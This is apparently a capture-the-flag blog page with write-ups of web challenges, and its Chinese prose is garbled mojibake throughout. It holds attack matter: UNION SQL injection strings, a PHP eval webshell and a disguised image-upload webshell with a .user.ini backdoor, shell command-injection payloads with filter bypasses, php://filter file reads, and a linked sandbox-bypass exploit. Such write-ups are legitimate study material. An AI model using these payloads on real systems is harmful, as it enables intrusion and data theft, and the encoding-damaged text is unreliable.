</strong></p><p>æˆ‘ä»¬å¯ä»¥ç”¨pythonè„šæœ¬æŠŠflaskçš„sessionè§£å¯†å‡ºæ¥ï¼Œä½†æ˜¯å¦‚æœæƒ³è¦åŠ å¯†ä¼ªé€ ç”Ÿæˆæˆ‘ä»¬è‡ªå·±çš„sessionçš„è¯ï¼Œè¿˜éœ€è¦çŸ¥é“flaskç”¨æ¥ç­¾åçš„SECRET_KEYï¼Œåœ¨githubæºç é‡Œæ‰¾æ‰¾ï¼Œå¯ä»¥åœ¨config.pyé‡Œå‘ç°ä¸‹é¢ä»£ç </p><p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener" title="flask_session_manage">https://github.com/noraj/flask-session-cookie-manager</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaixw55qtj30pa05qq39.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfalpci52zj30og04oq36.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfalpr57d2j30ml05xwjt.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfalqobraoj30mj05c42c.jpg" alt=""></p><p>ç”¨å¾—åˆ°çš„cookieå€¼æ›¿æ¢æ‰indexé¡µé¢çš„cookieå€¼ï¼Œå³å¯æˆåŠŸä¼ªé€ sessionï¼Œâ€å˜æˆadminâ€ï¼Œå¾—åˆ°flag</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaltk9yfnj30qb0bkt95.jpg" alt=""></p><p><strong>æ³•äºŒ â€”â€” Unicodeæ¬ºéª—</strong></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfamywjzioj30d502jglg.jpg" alt=""><br>è¿™é‡Œç”¨åˆ°äº†nodeprep.prepareå‡½æ•°ï¼Œè€Œnodeprepæ˜¯ä»twistedæ¨¡å—ä¸­å¯¼å…¥çš„from twisted.words.protocols.jabber.xmpp_stringprep import nodeprepï¼Œåœ¨requirements.txtæ–‡ä»¶ä¸­ï¼Œå‘ç°è¿™é‡Œç”¨åˆ°çš„twistedç‰ˆæœ¬æ˜¯Twisted==10.2.0ï¼Œè€Œå®˜ç½‘æœ€æ–°ç‰ˆæœ¬ä¸º19.2.0(2019/6/2)ï¼Œç‰ˆæœ¬å·®è·è¿™ä¹ˆå¤§ï¼Œä¼°è®¡æ˜¯å­˜åœ¨ä»€ä¹ˆæ¼æ´ã€‚</p><p>åŸç†å°±æ˜¯åˆ©ç”¨nodeprep.prepareå‡½æ•°ä¼šå°†unicodeå­—ç¬¦á´¬è½¬æ¢æˆAï¼Œè€ŒAåœ¨è°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°ä¼šæŠŠAè½¬æ¢æˆaã€‚<br>æ‰€ä»¥å½“æˆ‘ä»¬ç”¨á´¬dminæ³¨å†Œçš„è¯ï¼Œåå°ä»£ç è°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°ï¼ŒæŠŠç”¨æˆ·åè½¬æ¢æˆAdminï¼Œæˆ‘ä»¬ç”¨á´¬dminè¿›è¡Œç™»å½•ï¼Œå¯ä»¥çœ‹åˆ°indexé¡µé¢çš„usernameå˜æˆäº†Adminï¼Œè¯å®äº†æˆ‘ä»¬çš„çŒœæƒ³ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±æƒ³åŠæ³•è®©æœåŠ¡å™¨å†è°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°å³å¯ã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfan8syszjj30cq09j3yj.jpg" alt=""></p><p>æˆ‘ä»¬å‘ç°åœ¨æ”¹å¯†ç å‡½æ•°ä»£ç é‡Œï¼Œä¹Ÿç”¨åˆ°äº†nodeprep.prepareå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œæ”¹å¯†ç çš„è¯ï¼Œå…ˆä¼šæŠŠusernameæ”¹ä¸ºadminï¼Œä»è€Œæ”¹æ‰adminçš„å¯†ç ã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfana7tvutj30om0as74g.jpg" alt=""><br>ç„¶åç”¨adminå’Œæ”¹çš„å¯†ç çš„ç™»å½•ï¼Œå³å¯è·å–flagã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfanbj04yrj30sz0bpt95.jpg" alt=""></p><p><strong>è§£æ³•ä¸‰ â€”â€” æ¡ä»¶ç«äº‰</strong><br><a href="https://www.jianshu.com/p/f92311564ad0" target="_blank" rel="noopener" title="HCTF2018-admin">https://www.jianshu.com/p/f92311564ad0</a></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfanstiw0oj30sy04ggmf.jpg" alt=""><br>æŸ¥çœ‹æºç å‘ç°æç¤º</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfantton39j30lg0cd74g.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfanujro2lj30ev087dft.jpg" alt=""></p><p>ç»§ç»­ç‚¹å‡»ï¼Œå‘ç°ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œæ ¹æ®æç¤ºæŠ“åŒ…åˆ†æã€‚</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfanvn1llgj307804va9x.jpg" alt=""></p><p>å‘ç°phpé¡µé¢ï¼Œæ‰“å¼€è¯¥é¡µé¢<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbe5son5aj30uk0aaaap.jpg" alt=""><br>å‘ç°æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbefqitdfj30s7092aa9.jpg" alt=""><br>ä½†æ˜¯æ‰“å¼€flag.phpå¹¶ä¸èƒ½çœ‹åˆ°flagï¼Œæ‰€ä»¥flagåº”è¯¥æ˜¯å†™åœ¨phpä»£ç é‡Œé¢</p><p>ä¼ å…¥çš„æ–‡ä»¶è¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†æ²¡æœ‰è¿‡æ»¤filterï¼Œæ‰€ä»¥å¯ä»¥ç”¨php://filteræ¥è·å–æ–‡ä»¶ã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbebnttfzj31hc096abe.jpg" alt=""><br>è·å–åˆ°flag.phpçš„base64ç¼–ç ï¼Œè¿›è¡Œè§£ç è·å¾—flagã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbee8u6y0j30m60880tg.jpg" alt=""></p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbetawh5jj308g048mx2.jpg" alt=""></p><p>å‘ç°æ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œäºæ˜¯æƒ³åˆ°ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbeulv6d1j307n04pwef.jpg" alt=""></p><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬åå‘ç°&lt;?è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨&lt;?php,æ‰€ä»¥ä½¿ç”¨å…¶ä»–çš„æ–¹æ³•æ„é€ ä¸€å¥è¯æœ¨é©¬ï¼Œå¦‚scriptè„šæœ¬<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfoa6kc7j30hg00wa9v.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfp2jc2oj308v059mx5.jpg" alt=""></p><p>ä¸Šä¼ ä¹‹åå‘ç°é”™è¯¯æç¤ºï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡exif_imagetypeã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfrgfz2nj30hf01m0sm.jpg" alt=""></p><p>æ‰€ä»¥åœ¨ä¸€å¥è¯æœ¨é©¬å‰åŠ ä¸ŠGIF89aå†ä¸Šä¼ ã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfuz0qq3j30np05sgly.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfwrx895j30ae04wq2s.jpg" alt=""></p><p>ç„¶åç”¨èšå‰‘è¿æ¥index.phpé¡µé¢ï¼Œå‘ç°ä¸èƒ½è¿æ¥ï¼Œæ‰€ä»¥æ˜¯æœ¨é©¬æ²¡æœ‰æ‰§è¡Œã€‚</p><p>çœ‹äº†é¢˜è§£åå‘ç°è¿™é¢˜è¿˜æœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹å°±æ˜¯<strong>.user.ini</strong><br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener" title=".user.ini">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbg2rycpdj309w01tmwz.jpg" alt=""><br>äºæ˜¯åˆ›å»ºä¸€ä¸ª.user.iniæ–‡ä»¶å¹¶å°†.user.iniå’Œaaa.jpgæ–‡ä»¶ä¸Šä¼ <br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbg4unow1j30tl05m3yw.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbg63dc06j30ca03zmx5.jpg" alt=""></p><p>ç„¶åèšå‰‘è¿æ¥è·å¾—flagã€‚</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgko45ufj30rh0i5woi.jpg" alt=""><br>å°è¯•ä¸‡èƒ½å¯†ç <br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgm3qdh3j30tj09kgpl.jpg" alt=""><br>ç™»å½•æˆåŠŸï¼Œè¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgpg5cd6j30eu03iq32.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgpu8llwj30sy09fgp3.jpg" alt=""><br>è¯´æ˜æœ‰3ä¸ªå­—æ®µã€‚</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgr5czwlj30f80a4dj7.jpg" alt=""></p><p>åœ¨ç”¨æˆ·åæ–¹æ¡†é‡Œæ²¡æœ‰æ³¨å…¥æˆåŠŸï¼Œåœ¨å¯†ç æ–¹æ¡†é‡Œæ³¨å…¥æˆåŠŸ</p><p>åœ¨å¯†ç æ¡†ä¸­ä½¿ç”¨<br>adminâ€™ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #<br>åˆ—å‡ºè¡¨å<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbh26o28hj30lb0a0wi4.jpg" alt=""></p><p>æ¥ç€ä½¿ç”¨<br>adminâ€™ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=â€l0ve1ysq1â€ #<br>åˆ—å‡ºå­—æ®µ</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbh9yytzxj30m109z420.jpg" alt=""></p><p>æœ€åä½¿ç”¨<br>adminâ€™ union select 1,2,group_concat(password) from l0ve1ysq1 #<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbhbpxpejj30wy0d2jxu.jpg" alt=""></p><p>è·å¾—flagã€‚</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbl86nvixj30oj07g3zk.jpg" alt=""><br>æ ¹æ®æç¤ºï¼Œé¡µé¢æœ‰å¤‡ä»½æ–‡ä»¶</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbl7ooiwbj30aw011weh.jpg" alt=""></p><p>ä½¿ç”¨dirsearchæ‰«æï¼Œå‘ç°å¤‡ä»½æ–‡ä»¶<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbl9scevgj30l804gwep.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblb4esaxj30og0o3gn8.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblbvo3qlj30b403x3yh.jpg" alt=""></p><p>ä»class.phpå’Œindex.phpå¯çŸ¥ï¼Œè¯¥é¢˜æ˜¯ååºåŒ–æ¼æ´ã€‚ä»£ç å®¡è®¡å¯çŸ¥usernameåº”ä¸ºadminï¼Œpasswordåº”ä¸º100æ‰èƒ½è·å¾—flagã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblhrdqzsj30j00fl75c.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblitplw1j30lg01ya9x.jpg" alt=""></p><p>å°†ä»£ç ååºåŒ–</p><p>publicã€protectedä¸privateåœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«å’Œ__wakeup()æ–¹æ³•ç»•è¿‡å‚è€ƒï¼š<br><a href="https://www.cnblogs.com/wangtanzhi/p/12193930.html" target="_blank" rel="noopener" title="å‚è€ƒé“¾æ¥">https://www.cnblogs.com/wangtanzhi/p/12193930.html</a></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblqidxzoj314i0hddj5.jpg" alt=""><br>æ„é€ payloadè·å¾—flagï¼Œä¹Ÿå¯ä»¥å‚è€ƒä¸Šé¢çš„å‚è€ƒé“¾æ¥ä¸­<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblrwxv7sj30na01q0sn.jpg" alt=""></p><p>ç”¨pythonä¼ å€¼è·å¾—flag</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblwywrjlj30lt0980sw.jpg" alt=""></p><p>å‘ç°æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œç›´æ¥ç”¨èœåˆ€è¿æ¥</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblyno71fj30gj08e74n.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblzgek3aj30f403kq2y.jpg" alt=""></p><p>ç„¶åè·å¾—flagã€‚</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbm49rup2j30jw06iglm.jpg" alt=""></p><p>æŸ¥çœ‹æºç ï¼Œå‘ç°æç¤º<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbm5hp0hdj319b09pn3u.jpg" alt=""><br>æƒ³åˆ°æŠ“åŒ…ï¼Œç›´æ¥æ”¹headerå¤´ä¿¡æ¯å³å¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨Refererå¤´æ¥ä¿®æ”¹<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbm8kwmz8j30yn0ha76b.jpg" alt=""><br>ä¿®æ”¹ä¹‹åæç¤ºè¯´ä½¿ç”¨Sycloveræµè§ˆï¼Œäºæ˜¯ä¿®æ”¹User-Agent<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbma2trtuj30yp0gftan.jpg" alt=""><br>æ ¹æ®æç¤ºï¼Œéœ€è¦ä¿®æ”¹X-Forwarded-Forä¸º127.0.0.1<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbmcnwclyj30y70g940e.jpg" alt=""><br>ä»è€Œè·å¾—flagã€‚</p><h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbmr1prhpj30ne0dbdgp.jpg" alt=""></p><p>å®¡è®¡ä»£ç å‘ç°Ginkgoå¯ä»¥ä¼ å‚ï¼Œäºæ˜¯æƒ³åˆ°å¯ä»¥ä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå®¡è®¡ä»£ç å¯çŸ¥è¦æŠŠ$this-&gt;codeè¿›è¡Œbase64åŠ å¯†ã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbnef4v15j30qo0213yl.jpg" alt=""></p><p>æ‰€ä»¥Ginkgoä¼ å…¥åŠ å¯†åçš„<strong>@eval($_POST[value]);</strong><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbng00sipj30f60c774p.jpg" alt=""></p><p>ç”¨èšå‰‘è¿æ¥<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbnuh85awj30jw076taw.jpg" alt=""></p><p>ç›´æ¥åˆ©ç”¨githubä¸Šçš„exploit:<br><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener" title="exploit">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbnxf3636j30gd07wmxj.jpg" alt=""><br>æ”¹ä¸ºæ‰§è¡Œ/readflagã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbnyikohcj30s90fomy3.jpg" alt=""><br>ä¸Šä¼ åˆ°æœåŠ¡å™¨</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbo3njuclj30zr066t9l.jpg" alt=""><br>æ„é€ payloadï¼š?Ginkgo=include(â€˜/tmp/exploit.phpâ€™);å¹¶å°†include(â€˜/tmp/exploit.phpâ€™);ç”¨base64åŠ å¯†ï¼Œæ‰§è¡Œè·å¾—flagã€‚</p><h2 id="GKCTF2020-cveç‰ˆç­¾åˆ°"><a href="#GKCTF2020-cveç‰ˆç­¾åˆ°" class="headerlink" title="[GKCTF2020]cveç‰ˆç­¾åˆ°"></a>[GKCTF2020]cveç‰ˆç­¾åˆ°</h2><p>ç”±hintçŸ¥è¯†<strong>cve-2020-7066ï¼Œssrf</strong>æ¼æ´<br><a href="https://security-tracker.debian.org/tracker/CVE-2020-7066" target="_blank" rel="noopener" title="CVE-2020-7066">https://security-tracker.debian.org/tracker/CVE-2020-7066</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbo8gz2aaj30mi040t8s.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbo9eot9fj30rc0hu0th.jpg" alt=""><br>ç‚¹å‡»View CTFHubå‘ç°ä»€ä¹ˆä¹Ÿæ²¡æœ‰<br>æ ¹æ®æ¼æ´å¯çŸ¥å­˜åœ¨\0æˆªæ–­ã€‚<br><a href="https://blog.csdn.net/weixin_45485719/article/details/106432960?fps=1&locationNum=2" target="_blank" rel="noopener" title="cve-2020-7066ç®€å•è§£æ">https://blog.csdn.net/weixin_45485719/article/details/106432960?fps=1&amp;locationNum=2</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbofn9rapj309h014q2q.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbodclbhzj30u20gygn7.jpg" alt=""><br>æ ¹æ®æç¤ºçŸ¥åº”è¯¥æ”¹ä¸º127.0.0.123<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfboejavs8j30ti0hh75x.jpg" alt=""><br>ä»è€Œè·å¾—flagã€‚ </p><h2 id="GKCTF2020-è€å…«å°è¶…å¸‚å„¿"><a href="#GKCTF2020-è€å…«å°è¶…å¸‚å„¿" class="headerlink" title="[GKCTF2020]è€å…«å°è¶…å¸‚å„¿"></a>[GKCTF2020]è€å…«å°è¶…å¸‚å„¿</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbokpmsh8j30ze0bxjya.jpg" alt=""><br>ä»å›¾ä¸­å¯çŸ¥æ˜¯ShopXOæ¼æ´<br>å‚è€ƒ<br><a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener" title="ShopXO">http://www.nctry.com/1660.html</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbonczmoqj30vx0gracr.jpg" alt=""><br>è¿›å…¥åå°ç™»å½•ç•Œé¢ï¼Œç”¨admin,shopxoç™»å½•åå°<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbopongy4j30si0l9tdo.jpg" alt=""><br>ä¸‹è½½é»˜è®¤ä¸»é¢˜<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbottukynj30qw06naal.jpg" alt=""><br>å°†å†™å¥½çš„ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ç›´æ¥æ‹–å…¥å‹ç¼©åŒ…ä¸­(æ³¨æ„ï¼šä¸èƒ½å…ˆè§£å‹ç„¶åå°†æ–‡ä»¶æ”¾è¿›å»å†å‹ç¼©ï¼Œè¿™æ ·æ–‡ä»¶å°±ä¼šå¤±æ•ˆ)<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbow18efvj30lf0ea0tk.jpg" alt=""><br>ç„¶åä¸Šä¼ æœ¨é©¬æ–‡ä»¶ï¼Œç”¨èšå‰‘è¿æ¥<br>åœ°å€æ˜¯ï¼š<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbozq44m5j30lu01oaa1.jpg" alt=""><br>åœ¨ç›®å½•ä¸‹çœ‹åˆ°<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbp0wk696j30ko02it8o.jpg" alt=""><br>å‘Šè¯‰æˆ‘ä»¬flagåœ¨/rootä¸‹ï¼Œå¹¶ä¸”flaghintä¸­çš„æ—¶é—´æ¯éš”ä¸€åˆ†é’Ÿä¼šå˜åŒ–<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbp394dfvj30ih03ogln.jpg" alt=""><br>æ ¹æ®auto.shæ‰¾åˆ°makeflaghint.py<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbp78g5shj30a805dt8x.jpg" alt=""></p><p>å‘ç°æœ‰ä¿®æ”¹æƒé™ï¼Œä¸”æœ‰rootçš„æ‰§è¡Œæƒé™ï¼Œèƒ½æ¯60ç§’åˆ·æ–°hintæ–‡ä»¶ã€‚</p><p>rb+ è¯»å†™æ‰“å¼€ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåªå…è®¸è¯»å†™æ•°æ®ã€‚<br><a href="https://blog.csdn.net/guyue6670/article/details/6681037" target="_blank" rel="noopener" title="fopen">https://blog.csdn.net/guyue6670/article/details/6681037</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbpc2izasj30a006ct90.jpg" alt=""></p><p>äºæ˜¯ä¿®æ”¹ä»£ç èƒ½è¯»å–flagå¹¶å†™å…¥flag.hintæ–‡ä»¶ä¸­<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbpdoahgmj30bp03wq2z.jpg" alt=""></p><p>ç­‰å¾…60ç§’æŸ¥çœ‹è·å¾—flagã€‚</p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h2><p>æœ¬é¢˜æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½¿ç”¨php://filterä¼ªåè®®æ¥è¿›è¡ŒåŒ…å«ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giozldc8t9j31b60k53zv.jpg" alt=""><br>è·å¾—ä¸€æ®µbase64ç¼–ç ã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giozma059gj30cr022glm.jpg" alt=""><br>base64è§£å¯†åè·å¾—flagã€‚</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqis13lyqj30us0liwfq.jpg" alt=""><br>å’Œä¹‹å‰åšè¿‡çš„ä¸€ä¸ªé¢˜ç±»ä¼¼ï¼Œç›´æ¥æ„é€ payload:<br>?ip=127.0.0.1|ls<br>å‘ç°flagæ–‡ä»¶ã€‚  |ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giqivbz1h2j30xq0lcabb.jpg" alt=""><br>ç›´æ¥cat flag.phpå‘ç°é¢˜ç›®è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰€ä»¥ç”¨${IFS}$ç»•è¿‡ç©ºæ ¼ã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqj1r0h4qj30vn0kygmu.jpg" alt=""><br>ä½¿ç”¨${IFS}$å‘ç°è¿‡æ»¤äº†{ç¬¦å·ï¼Œæ‰€ä»¥ä½¿ç”¨$IFS$1è¿‡æ»¤ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giqj3f00kkj30rq0l8gmq.jpg" alt=""><br>ä½¿ç”¨$IFS$1å‘ç°é¢˜ç›®åˆè¿‡æ»¤äº†flagã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqj47ke8cj30u50lb76l.jpg" alt=""><br>æŸ¥çœ‹è¯¥é¢˜æºç å³å¯çŸ¥é“æœ¬æ¬¡è¿‡æ»¤äº†å“ªäº›ä¸œè¥¿ã€‚</p><p>æ–¹æ³•ä¸€ï¼š<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqj6axvdrj30t90lc0v0.jpg" alt=""><br>å‚è€ƒå¤§ä½¬çš„wpï¼Œæ„é€ payload:cat$IFS$1<code>ls</code>,æŸ¥çœ‹æºç è·å¾—flagã€‚<br>è¯¥æ–¹æ³•åå«å†…è”æ‰§è¡Œã€‚æ–¹æ³•ï¼šå°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œã€‚</p><p>æ–¹æ³•äºŒï¼š<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giqjxzkiesj31050legmz.jpg" alt=""><br>Y2F0IGZsYWcucGhwæ˜¯cat flag.phpçš„base64ç¼–ç ã€‚</p><p>æ–¹æ³•ä¸‰ï¼š<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giqk3hkg8jj30wg0lidh7.jpg" alt=""><br>é‡‡ç”¨æ‹¼æ¥çš„æ–¹æ³•ã€‚<br>å‚è€ƒ:<a href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener">https://www.ghtwf01.cn/index.php/archives/273/</a></p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giqkcm3prij30oy0a9q37.jpg" alt=""><br>æ‰“å¼€å‘ç°å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œäºæ˜¯æ„é€ ä¸€æ ·çš„payloadå‘ç°è¯¥ç›®å½•ä¸‹æ²¡æœ‰flagã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqke8rijtj30d309aq2w.jpg" alt=""></p><p>æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•ä¹Ÿæ²¡æœ‰å‘ç°flagã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giqkfcr8nyj30d40izjrl.jpg" 